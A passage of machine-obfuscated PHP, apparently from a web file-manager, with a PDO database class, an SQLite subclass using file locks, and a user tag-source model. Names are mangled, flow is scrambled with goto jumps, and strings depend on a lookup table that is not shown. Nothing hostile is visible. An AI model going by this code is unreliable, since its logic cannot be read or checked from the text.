$EÀ³ÀØÜ£[836] . trim($A—‡ƒÄ½Û­, $EÀ³ÀØÜ£[836]) . $EÀ³ÀØÜ£[836]; } return $A—‡ƒÄ½Û­; } } class DbPdo extends Db { protected $PDOStatement = null; private $table = ''; public function __construct($B˜¢ÔÄ¯ŠŸ = '') { $fÁœëšƒ¼° =& $_SERVER[¬ˆÚÂ”Éğä]; if (!class_exists($fÁœëšƒ¼°[838])) { think_exception(think_lang($fÁœëšƒ¼°[10]) . $fÁœëšƒ¼°[839]); } if (!empty($B˜¢ÔÄ¯ŠŸ)) { $this->config = $B˜¢ÔÄ¯ŠŸ; if (empty($this->config[$fÁœëšƒ¼°[13]])) { $this->config[$fÁœëšƒ¼°[13]] = array(); } } } public function connect($c¿í©Šõ£ = '', $dĞ—ï¦¶‡ = 0) { $FçÖ¤«§µ× =& $_SERVER[¬ˆÚÂ”Éğä]; if (!isset($this->linkID[$dĞ—ï¦¶‡])) { goto A¨¯×²¨º; a—Ÿ²¨›Ü“: $this->dbType = $this->_getDsnType($c¿í©Šõ£[$FçÖ¤«§µ×[840]]); if (in_array($this->dbType, array($FçÖ¤«§µ×[841], $FçÖ¤«§µ×[842], $FçÖ¤«§µ×[843], $FçÖ¤«§µ×[844]))) { think_exception($FçÖ¤«§µ×[845] . $this->dbType . $FçÖ¤«§µ×[846] . $this->dbType . $FçÖ¤«§µ×[847]); } if (!$this->linkID[$dĞ—ï¦¶‡]) { think_exception($FçÖ¤«§µ×[848]); } goto c‘áÙÇÛÎ‡; c‘áÙÇÛÎ‡: try { $this->linkID[$dĞ—ï¦¶‡]->exec($FçÖ¤«§µ×[849] . think_config($FçÖ¤«§µ×[816])); } catch (Exception $E‘Úâ÷Ö‡Í) { } $this->connected = !0; if (1 != think_config($FçÖ¤«§µ×[18])) { unset($this->config); } goto FÔŞÕºå„Š; A¨¯×²¨º: if (empty($c¿í©Šõ£)) { $c¿í©Šõ£ = $this->config; } if ($this->pconnect) { $c¿í©Šõ£[$FçÖ¤«§µ×[13]][PDO::ATTR_PERSISTENT] = !0; } try { $this->linkID[$dĞ—ï¦¶‡] = new PDO($c¿í©Šõ£[$FçÖ¤«§µ×[840]], $c¿í©Šõ£[$FçÖ¤«§µ×[813]], $c¿í©Šõ£[$FçÖ¤«§µ×[814]], $c¿í©Šõ£[$FçÖ¤«§µ×[13]]); } catch (PDOException $E‘Úâ÷Ö‡Í) { think_exception($E‘Úâ÷Ö‡Í->getMessage()); } goto a—Ÿ²¨›Ü“; FÔŞÕºå„Š: } return $this->linkID[$dĞ—ï¦¶‡]; } public function free() { $this->PDOStatement = null; } public function query($CŞØ™óçøš, $fìÁÄ·¶ÍÍ = array()) { goto EÏó§Çİè; F¸¹Á†ÚÙÌ: if (!1 === $this->PDOStatement) { think_exception($this->error()); } $D¬‹‹Àˆßš = $this->PDOStatement->execute($fìÁÄ·¶ÍÍ); $this->debug(); goto EÂöËÓŸëÖ; aÄ®ÆÁ „: $this->queryStr = $CŞØ™óçøš; if (!empty($fìÁÄ·¶ÍÍ)) { $this->queryStr .= $f¦ªÄÓÒ«ª[850] . print_r($fìÁÄ·¶ÍÍ, !0) . $f¦ªÄÓÒ«ª[851]; } if (!empty($this->PDOStatement)) { $this->free(); } goto aÓš¢®àÏ»; aÓš¢®àÏ»: think_action_status($f¦ªÄÓÒ«ª[19], 1); think_status($f¦ªÄÓÒ«ª[20]); $this->PDOStatement = $this->_linkID->prepare($CŞØ™óçøš); goto F¸¹Á†ÚÙÌ; EÏó§Çİè: $f¦ªÄÓÒ«ª =& $_SERVER[¬ˆÚÂ”Éğä]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto aÄ®ÆÁ „; EÂöËÓŸëÖ: if (!1 === $D¬‹‹Àˆßš) { $this->error(); return !1; } else { return $this->getAll(); } goto cŒÇ©œŒà¯; cŒÇ©œŒà¯: } public function execute($A×ì„¥¸õ, $FÕ¸ŞùãåÂ = array()) { goto fëÚ‰•‹Ù; B¹¼·Î…ÉÆ: $this->queryStr = $A×ì„¥¸õ; if (!empty($FÕ¸ŞùãåÂ)) { $this->queryStr .= $BÍ©•Å‹³Œ[850] . print_r($FÕ¸ŞùãåÂ, !0) . $BÍ©•Å‹³Œ[851]; } $cµÛƒË°Ì« = !1; goto aÂ‚Á®‹É; bíãšÆóõİ: think_status($BÍ©•Å‹³Œ[20]); $this->PDOStatement = $this->_linkID->prepare($A×ì„¥¸õ); if (!1 === $this->PDOStatement) { think_exception($this->error()); } goto DñÎè ÑÑ½; DñÎè ÑÑ½: $fÙÕøÚÜ = $this->PDOStatement->execute($FÕ¸ŞùãåÂ); $this->debug(); if (!1 === $fÙÕøÚÜ) { $this->error(); return !1; } else { $this->numRows = $this->PDOStatement->rowCount(); if ($cµÛƒË°Ì« || preg_match($BÍ©•Å‹³Œ[856], $A×ì„¥¸õ)) { $this->lastInsID = $this->getLastInsertId(); } return $this->numRows; } goto A´ñ†ÚÁÙğ; aÂ‚Á®‹É: if ($this->dbType == $BÍ©•Å‹³Œ[844]) { if (preg_match($BÍ©•Å‹³Œ[852], $this->queryStr, $E‡ßÃÚÌ˜)) { $this->table = think_config($BÍ©•Å‹³Œ[853]) . str_ireplace(think_config($BÍ©•Å‹³Œ[854]), $BÍ©•Å‹³Œ[361], $E‡ßÃÚÌ˜[2]); $cµÛƒË°Ì« = (bool) $this->query($BÍ©•Å‹³Œ[855] . strtoupper($this->table) . $BÍ©•Å‹³Œ[55]); } } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($BÍ©•Å‹³Œ[21], 1); goto bíãšÆóõİ; fëÚ‰•‹Ù: $BÍ©•Å‹³Œ =& $_SERVER[¬ˆÚÂ”Éğä]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto B¹¼·Î…ÉÆ; A´ñ†ÚÁÙğ: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->beginTransaction(); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $c’šÓ×¾İŸ = $this->_linkID->commit(); $this->transTimes = 0; if (!$c’šÓ×¾İŸ) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $c–Î  ›ëœ = $this->_linkID->rollback(); $this->transTimes = 0; if (!$c–Î  ›ëœ) { $this->error(); return !1; } } return !0; } private function getAll() { $E’ñÌ¡õß“ = $this->PDOStatement->fetchAll(PDO::FETCH_ASSOC); $this->numRows = count($E’ñÌ¡õß“); return $E’ñÌ¡õß“; } public function getFields($béî™ì¤°«) { goto a½¼É¢Å”; eÎÈøòÀÂã: $EŸ‰‡×«ƒä = $this->query($a©Ç®¬Öø„); $Aèó¢Ñ¼¬¹ = array(); if ($EŸ‰‡×«ƒä) { foreach ($EŸ‰‡×«ƒä as $cå‰¤Åš‚ö => $AÎĞ¦‹ÊßÚ) { $AÎĞ¦‹ÊßÚ = array_change_key_case($AÎĞ¦‹ÊßÚ); $AÎĞ¦‹ÊßÚ[$FÜŠ ³Óåˆ[28]] = isset($AÎĞ¦‹ÊßÚ[$FÜŠ ³Óåˆ[28]]) ? $AÎĞ¦‹ÊßÚ[$FÜŠ ³Óåˆ[28]] : $FÜŠ ³Óåˆ[361]; $AÎĞ¦‹ÊßÚ[$FÜŠ ³Óåˆ[29]] = isset($AÎĞ¦‹ÊßÚ[$FÜŠ ³Óåˆ[29]]) ? $AÎĞ¦‹ÊßÚ[$FÜŠ ³Óåˆ[29]] : $FÜŠ ³Óåˆ[361]; $fŠ”ÇáÉœƒ = isset($AÎĞ¦‹ÊßÚ[$FÜŠ ³Óåˆ[261]]) ? $AÎĞ¦‹ÊßÚ[$FÜŠ ³Óåˆ[261]] : $AÎĞ¦‹ÊßÚ[$FÜŠ ³Óåˆ[28]]; $Aèó¢Ñ¼¬¹[$fŠ”ÇáÉœƒ] = array($FÜŠ ³Óåˆ[28] => $fŠ”ÇáÉœƒ, $FÜŠ ³Óåˆ[29] => $AÎĞ¦‹ÊßÚ[$FÜŠ ³Óåˆ[29]], $FÜŠ ³Óåˆ[31] => (bool) (isset($AÎĞ¦‹ÊßÚ[$FÜŠ ³Óåˆ[99]]) && $AÎĞ¦‹ÊßÚ[$FÜŠ ³Óåˆ[99]] === $FÜŠ ³Óåˆ[33] || isset($AÎĞ¦‹ÊßÚ[$FÜŠ ³Óåˆ[31]]) && $AÎĞ¦‹ÊßÚ[$FÜŠ ³Óåˆ[31]] === $FÜŠ ³Óåˆ[33]), $FÜŠ ³Óåˆ[34] => isset($AÎĞ¦‹ÊßÚ[$FÜŠ ³Óåˆ[34]]) ? $AÎĞ¦‹ÊßÚ[$FÜŠ ³Óåˆ[34]] : (isset($AÎĞ¦‹ÊßÚ[$FÜŠ ³Óåˆ[53]]) ? $AÎĞ¦‹ÊßÚ[$FÜŠ ³Óåˆ[53]] : $FÜŠ ³Óåˆ[361]), $FÜŠ ³Óåˆ[36] => isset($AÎĞ¦‹ÊßÚ[$FÜŠ ³Óåˆ[89]]) ? strtolower($AÎĞ¦‹ÊßÚ[$FÜŠ ³Óåˆ[89]]) == $FÜŠ ³Óåˆ[38] : (isset($AÎĞ¦‹ÊßÚ[$FÜŠ ³Óåˆ[54]]) ? $AÎĞ¦‹ÊßÚ[$FÜŠ ³Óåˆ[54]] : !1), $FÜŠ ³Óåˆ[39] => isset($AÎĞ¦‹ÊßÚ[$FÜŠ ³Óåˆ[873]]) ? strtolower($AÎĞ¦‹ÊßÚ[$FÜŠ ³Óåˆ[873]]) == $FÜŠ ³Óåˆ[41] : (isset($AÎĞ¦‹ÊßÚ[$FÜŠ ³Óåˆ[89]]) ? $AÎĞ¦‹ÊßÚ[$FÜŠ ³Óåˆ[89]] : !1)); } } goto føÆ”åÚ; føÆ”åÚ: return $Aèó¢Ñ¼¬¹; goto E¢ù½‰‚Ÿæ; a½¼É¢Å”: $FÜŠ ³Óåˆ =& $_SERVER[¬ˆÚÂ”Éğä]; $this->initConnect(!0); if (think_config($FÜŠ ³Óåˆ[857])) { $a©Ç®¬Öø„ = str_replace($FÜŠ ³Óåˆ[858], $béî™ì¤°«, think_config($FÜŠ ³Óåˆ[857])); } else { switch ($this->dbType) { case $FÜŠ ³Óåˆ[841]: case $FÜŠ ³Óåˆ[859]: $a©Ç®¬Öø„ = "\123\105\114\105\103\124\40\40\40\143\157\x6c\165\x6d\156\x5f\156\141\155\145\x20\141\x73\40\x27\x4e\141\x6d\145\47\x2c\40\x20\40\144\x61\164\141\137\x74\171\160\x65\40\x61\163\40\x27\124\x79\160\145\x27\x2c\x20\x20\x20\x63\157\154\165\155\156\137\144\145\146\x61\x75\154\164\x20\x61\x73\x20\x27\104\145\146\141\x75\x6c\164\47\54\x20\x20\40\151\163\137\x6e\x75\x6c\x6c\x61\142\x6c\x65\40\x61\x73\x20\x27\116\x75\x6c\154\47\xa\x9\11\106\122\117\115\x9\x69\x6e\146\157\x72\155\141\x74\x69\157\x6e\x5f\x73\x63\x68\x65\155\x61\56\x74\x61\x62\154\x65\163\40\101\123\40\x74\xa\x9\x9\112\117\111\116\x9\151\156\x66\157\x72\x6d\x61\164\151\x6f\156\137\x73\143\150\x65\x6d\141\x2e\x63\x6f\x6c\x75\x6d\156\163\40\101\123\40\x63\12\x9\11\117\116\40\40\164\56\164\x61\142\154\145\137\x63\x61\164\x61\x6c\157\x67\40\75\40\143\56\x74\x61\142\154\145\x5f\x63\x61\x74\x61\x6c\x6f\x67\12\11\x9\101\x4e\104\40\x74\x2e\x74\x61\142\154\145\x5f\163\143\x68\145\x6d\x61\x20\75\40\x63\x2e\x74\141\x62\x6c\145\137\163\143\x68\145\155\141\xa\x9\11\101\116\x44\x20\x74\56\164\141\142\154\145\x5f\156\x61\155\x65\40\75\40\143\x2e\164\141\x62\154\x65\x5f\156\141\x6d\x65\12\11\11\127\x48\x45\122\105\40\40\40\x74\x2e\x74\141\x62\x6c\x65\137\156\x61\x6d\145\40\x3d\40\x27{$béî™ì¤°«}\47"; break; case $FÜŠ ³Óåˆ[860]: $a©Ç®¬Öø„ = $FÜŠ ³Óåˆ[861] . $béî™ì¤°« . $FÜŠ ³Óåˆ[862]; break; case $FÜŠ ³Óåˆ[842]: case $FÜŠ ³Óåˆ[844]: $a©Ç®¬Öø„ = $FÜŠ ³Óåˆ[863] . $FÜŠ ³Óåˆ[864] . $FÜŠ ³Óåˆ[865] . strtoupper($béî™ì¤°«) . $FÜŠ ³Óåˆ[866] . strtoupper($béî™ì¤°«) . $FÜŠ ³Óåˆ[867]; break; case $FÜŠ ³Óåˆ[868]: $a©Ç®¬Öø„ = $FÜŠ ³Óåˆ[869] . $béî™ì¤°« . $FÜŠ ³Óåˆ[870]; break; case $FÜŠ ³Óåˆ[843]: break; case $FÜŠ ³Óåˆ[871]: default: $a©Ç®¬Öø„ = $FÜŠ ³Óåˆ[872] . ($this->dbType == $FÜŠ ³Óåˆ[871] ? "\x60{$béî™ì¤°«}\140" : $béî™ì¤°«); } } goto eÎÈøòÀÂã; E¢ù½‰‚Ÿæ: } public function getTables($A¬×Í¾½ = '') { $eîÀÇŠƒË¿ =& $_SERVER[¬ˆÚÂ”Éğä]; if (think_config($eîÀÇŠƒË¿[874])) { $f‡îŠô»½¢ = str_replace($eîÀÇŠƒË¿[875], $A¬×Í¾½, think_config($eîÀÇŠƒË¿[874])); } else { switch ($this->dbType) { case $eîÀÇŠƒË¿[842]: case $eîÀÇŠƒË¿[844]: $f‡îŠô»½¢ = $eîÀÇŠƒË¿[876]; break; case $eîÀÇŠƒË¿[841]: case $eîÀÇŠƒË¿[859]: $f‡îŠô»½¢ = $eîÀÇŠƒË¿[877]; break; case $eîÀÇŠƒË¿[868]: $f‡îŠô»½¢ = $eîÀÇŠƒË¿[878]; break; case $eîÀÇŠƒË¿[843]: think_exception(think_lang($eîÀÇŠƒË¿[879]) . $eîÀÇŠƒË¿[880]); break; case $eîÀÇŠƒË¿[860]: $f‡îŠô»½¢ = $eîÀÇŠƒË¿[42] . $eîÀÇŠƒË¿[43] . $eîÀÇŠƒË¿[44]; break; case $eîÀÇŠƒË¿[871]: default: if (!empty($A¬×Í¾½)) { $f‡îŠô»½¢ = $eîÀÇŠƒË¿[824] . $A¬×Í¾½; } else { $f‡îŠô»½¢ = $eîÀÇŠƒË¿[825]; } } } $CØ·¡¼É = $this->query($f‡îŠô»½¢); $FÂ•‡Ë„¥ = array(); foreach ($CØ·¡¼É as $aœôˆ±½çŒ => $c­§•ĞÖ–) { $FÂ•‡Ë„¥[$aœôˆ±½çŒ] = current($c­§•ĞÖ–); } return $FÂ•‡Ë„¥; } protected function parseLimit($dè£¨ñ“±Ö) { $Eí‡ë³£ÔÖ =& $_SERVER[¬ˆÚÂ”Éğä]; $E‚Ï‰¶Å²Ê = $Eí‡ë³£ÔÖ[33]; if (!empty($dè£¨ñ“±Ö)) { switch ($this->dbType) { case $Eí‡ë³£ÔÖ[868]: case $Eí‡ë³£ÔÖ[860]: $dè£¨ñ“±Ö = explode($Eí‡ë³£ÔÖ[47], $dè£¨ñ“±Ö); if (count($dè£¨ñ“±Ö) > 1) { $E‚Ï‰¶Å²Ê .= $Eí‡ë³£ÔÖ[48] . $dè£¨ñ“±Ö[1] . $Eí‡ë³£ÔÖ[49] . $dè£¨ñ“±Ö[0] . $Eí‡ë³£ÔÖ[50]; } else { $E‚Ï‰¶Å²Ê .= $Eí‡ë³£ÔÖ[48] . $dè£¨ñ“±Ö[0] . $Eí‡ë³£ÔÖ[50]; } break; case $Eí‡ë³£ÔÖ[841]: case $Eí‡ë³£ÔÖ[859]: break; case $Eí‡ë³£ÔÖ[843]: break; case $Eí‡ë³£ÔÖ[842]: case $Eí‡ë³£ÔÖ[844]: break; case $Eí‡ë³£ÔÖ[871]: default: $E‚Ï‰¶Å²Ê .= $Eí‡ë³£ÔÖ[48] . $dè£¨ñ“±Ö . $Eí‡ë³£ÔÖ[50]; } } return $E‚Ï‰¶Å²Ê; } public function parseKey(&$aÜ˜®î¢‹…, $fÇì¨‘›ç = true) { $aã³¯Ü£ÕÈ =& $_SERVER[¬ˆÚÂ”Éğä]; if ($fÇì¨‘›ç) { $aÜ˜®î¢‹… = $this->parseKeyCheck($aÜ˜®î¢‹…); } if ($this->dbType == $aã³¯Ü£ÕÈ[871]) { if ($aÜ˜®î¢‹… != $aã³¯Ü£ÕÈ[176] && !preg_match($aã³¯Ü£ÕÈ[835], $aÜ˜®î¢‹…)) { $aÜ˜®î¢‹… = $aã³¯Ü£ÕÈ[836] . trim($aÜ˜®î¢‹…, $aã³¯Ü£ÕÈ[836]) . $aã³¯Ü£ÕÈ[836]; } return $aÜ˜®î¢‹…; } else { return parent::parseKey($aÜ˜®î¢‹…); } } public function close() { $this->_linkID = null; } public function error() { $f„‘ß½óš =& $_SERVER[¬ˆÚÂ”Éğä]; if ($this->PDOStatement) { $Fïí‰²ßØ = $this->PDOStatement->errorInfo(); $this->error = $Fïí‰²ßØ[1] . $f„‘ß½óš[4] . $Fïí‰²ßØ[2]; } else { $this->error = $f„‘ß½óš[33]; } if ($f„‘ß½óš[33] != $this->queryStr) { $this->error .= LNG($f„‘ß½óš[45]) . $this->queryStr; } think_trace($this->error, $f„‘ß½óš[33], $f„‘ß½óš[46]); return $this->error; } public function escapeString($dæ®ä—¡¼) { $c‹ÎÏÏ¿„ =& $_SERVER[¬ˆÚÂ”Éğä]; switch ($this->dbType) { case $c‹ÎÏÏ¿„[868]: case $c‹ÎÏÏ¿„[841]: case $c‹ÎÏÏ¿„[859]: case $c‹ÎÏÏ¿„[871]: return addslashes($dæ®ä—¡¼); case $c‹ÎÏÏ¿„[843]: case $c‹ÎÏÏ¿„[860]: case $c‹ÎÏÏ¿„[842]: case $c‹ÎÏÏ¿„[844]: return str_ireplace($c‹ÎÏÏ¿„[55], $c‹ÎÏÏ¿„[56], $dæ®ä—¡¼); } } protected function parseValue($F˜ã¿ï¸¹) { $bÀñèªëÀÒ =& $_SERVER[¬ˆÚÂ”Éğä]; if (is_string($F˜ã¿ï¸¹)) { $F˜ã¿ï¸¹ = strpos($F˜ã¿ï¸¹, $bÀñèªëÀÒ[4]) === 0 ? $this->escapeString($F˜ã¿ï¸¹) : $bÀñèªëÀÒ[881] . $this->escapeString($F˜ã¿ï¸¹) . $bÀñèªëÀÒ[881]; } elseif (isset($F˜ã¿ï¸¹[0]) && is_string($F˜ã¿ï¸¹[0]) && strtolower($F˜ã¿ï¸¹[0]) == $bÀñèªëÀÒ[285]) { $F˜ã¿ï¸¹ = $this->escapeString($F˜ã¿ï¸¹[1]); } elseif (is_array($F˜ã¿ï¸¹)) { $F˜ã¿ï¸¹ = array_map(array($this, $bÀñèªëÀÒ[882]), $F˜ã¿ï¸¹); } elseif (is_bool($F˜ã¿ï¸¹)) { $F˜ã¿ï¸¹ = $F˜ã¿ï¸¹ ? $bÀñèªëÀÒ[83] : $bÀñèªëÀÒ[470]; } elseif (is_null($F˜ã¿ï¸¹)) { $F˜ã¿ï¸¹ = $bÀñèªëÀÒ[99]; } return $F˜ã¿ï¸¹; } public function getLastInsertId() { $Cºñ²£×±Š =& $_SERVER[¬ˆÚÂ”Éğä]; switch ($this->dbType) { case $Cºñ²£×±Š[868]: case $Cºñ²£×±Š[860]: case $Cºñ²£×±Š[841]: case $Cºñ²£×±Š[859]: case $Cºñ²£×±Š[843]: case $Cºñ²£×±Š[871]: return $this->_linkID->lastInsertId(); case $Cºñ²£×±Š[842]: case $Cºñ²£×±Š[844]: $a™²Èîå ˜ = $this->table; $b•¶Áî¥¤Ò = $this->query("\x53\x45\114\105\103\124\40{$a™²Èîå ˜}\x2e\143\x75\162\162\x76\141\154\x20\x63\x75\x72\x72\x76\141\154\x20\106\122\x4f\115\40\x64\x75\x61\x6c"); return $b•¶Áî¥¤Ò ? $b•¶Áî¥¤Ò[0][$Cºñ²£×±Š[883]] : 0; } } } class DbSqlite extends DbSqliteBase { public function query($dÂÑØ–İÔÑ) { goto EîâÌªŒæ’; Bï×Ş”Ù§‹: fclose($aƒµ¶×); show_json($eÕĞ…’ñ“[886], !1); return !1; goto CÚÚø›‰¦ã; E–‡Î¥ˆ•: if (!$aƒµ¶×) { return !1; } if (flock($aƒµ¶×, LOCK_EX)) { $CŞ×Š«è¯ = parent::query($dÂÑØ–İÔÑ); flock($aƒµ¶×, LOCK_UN); fclose($aƒµ¶×); return $CŞ×Š«è¯; } flock($aƒµ¶×, LOCK_UN); goto Bï×Ş”Ù§‹; EîâÌªŒæ’: $eÕĞ…’ñ“ =& $_SERVER[¬ˆÚÂ”Éğä]; $B†˜»•áêƒ = DATA_PATH . $eÕĞ…’ñ“[884]; $aƒµ¶× = fopen($B†˜»•áêƒ, $eÕĞ…’ñ“[885]); goto E–‡Î¥ˆ•; CÚÚø›‰¦ã: } public function execute($f’ƒ§ÁÏ ó) { goto AŒÃ­¤³îâ; A–’ËŸá: fclose($cå“ƒ¬); show_json($dáÆ÷õµÍÖ[886], !1); return !1; goto aŠ¯¬®Ïê£; Aêµä­³‡: if (!$cå“ƒ¬) { return !1; } if (flock($cå“ƒ¬, LOCK_EX)) { $fÈ«”‡øŸæ = parent::execute($f’ƒ§ÁÏ ó); flock($cå“ƒ¬, LOCK_UN); fclose($cå“ƒ¬); return $fÈ«”‡øŸæ; } flock($cå“ƒ¬, LOCK_UN); goto A–’ËŸá; AŒÃ­¤³îâ: $dáÆ÷õµÍÖ =& $_SERVER[¬ˆÚÂ”Éğä]; $b·ŠÃÔæˆ = DATA_PATH . $dáÆ÷õµÍÖ[884]; $cå“ƒ¬ = fopen($b·ŠÃÔæˆ, $dáÆ÷õµÍÖ[885]); goto Aêµä­³‡; aŠ¯¬®Ïê£: } } goto aã¨õ‘ã¨“; a§œòÔÓ¼Ú: class UserTagSourceModel extends ModelBase { protected $tableName = "\x75\163\145\x72\x5f\x66\141\166"; protected function cacheFunctionAlias($a¹òÂ’¤Äï) { $eºÆ ÄÈŒò =& $_SERVER[¬ˆÚÂ”Éğä]; return array($eºÆ ÄÈŒò[2217] => array(USER_ID, $eºÆ ÄÈŒò[2218])); } protected function listData() { $eœ‘£é¯³‹ =& $_SERVER[¬ˆÚÂ”Éğä]; $CÀĞÕ‡Ú›– = array($eœ‘£é¯³‹[1441] => USER_ID, $eœ‘£é¯³‹[436] => array($eœ‘£é¯³‹[2221], 0)); $f÷¹ĞÈ¼Òš = $eœ‘£é¯³‹[2223]; $b…Ã‡Ü¼³ï = $this->field($f÷¹ĞÈ¼Òš)->where($CÀĞÕ‡Ú›–)->order($eœ‘£é¯³‹[2224])->select(); return $b…Ã‡Ü¼³ï ? $b…Ã‡Ü¼³ï : array(); } protected function listByTag($BŸô®³¾Á¤) { } protected function addToTag($Bá»µ”ª¨å, $c¥ ÕÃÚÙĞ) { $f„†Şöòæ‚ =& $_SERVER[¬ˆÚÂ”Éğä]; if (!Model($f„†Şöòæ‚[2360])->listData($c¥ ÕÃÚÙĞ) || !Model($f„†Şöòæ‚[760])->pathInfo($Bá»µ”ª¨å)) { return !1; } $fçòãìÄ÷ò = array($f„†Şöòæ‚[1441] => USER_ID, $f„†Şöòæ‚[436] => $c¥ ÕÃÚÙĞ, $f„†Şöòæ‚[387] => $Bá»µ”ª¨å, $f„†Şöòæ‚[388] => $f„†Şöòæ‚[382], $f„†Şöòæ‚[386] => $f„†Şöòæ‚[33], $f„†Şöòæ‚[2125] => 0); if ($this->where($fçòãìÄ÷ò)->find()) { return !1; } return $this->add($fçòãìÄ÷ò); } protected function removeFromTag($DŒ‹ßô×î, $a¨”ÊÎ°») { $DøµİÛÈ–Š =& $_SERVER[¬ˆÚÂ”Éğä]; if (!Model($DøµİÛÈ–Š[2360])->listData($a¨”ÊÎ°»)) { return !1; } if (is_array($DŒ‹ßô×î)) { $DŒ‹ßô×î = array($DøµİÛÈ–Š[7], $DŒ‹ßô×î); } $dÏ—Üëƒœ„ = array($DøµİÛÈ–Š[1441] => USER_ID, $DøµİÛÈ–Š[436] => $a¨”ÊÎ°», $DøµİÛÈ–Š[388] => $DøµİÛÈ–Š[382], $DøµİÛÈ–Š[387] => $DŒ‹ßô×î); return $this->where($dÏ—Üëƒœ„)->delete(); } protected function removeByTag($E²²¨»°®İ) { $A²ŒŒ–òì =& $_SERVER[¬ˆÚÂ”Éğä]; if (!$E²²¨»°®İ) { return !1; } $d·Š´íô¹ª = array($A²ŒŒ–òì[1441] => USER_ID, $A²ŒŒ–òì[436] => $E²²¨»°®İ); return $this->where($d·Š´íô¹ª)->delete(); } protected function removeBySource($a°Òø†±²Û) { $føá÷›Ïœ =& $_SERVER[¬ˆÚÂ”Éğä]; if (is_array($a°Òø†±²Û)) { $a°Òø†±²Û = array($føá÷›Ïœ[7], $a°Òø†±²Û); } $FäËâ‚÷ƒ = array($føá÷›Ïœ[1441] => USER_ID, $føá÷›Ïœ[387] => $a°Òø†±²Û, $føá÷›Ïœ[436] => array($føá÷›Ïœ[940], 0)); return $this->where($FäËâ‚÷ƒ)->delete(); } }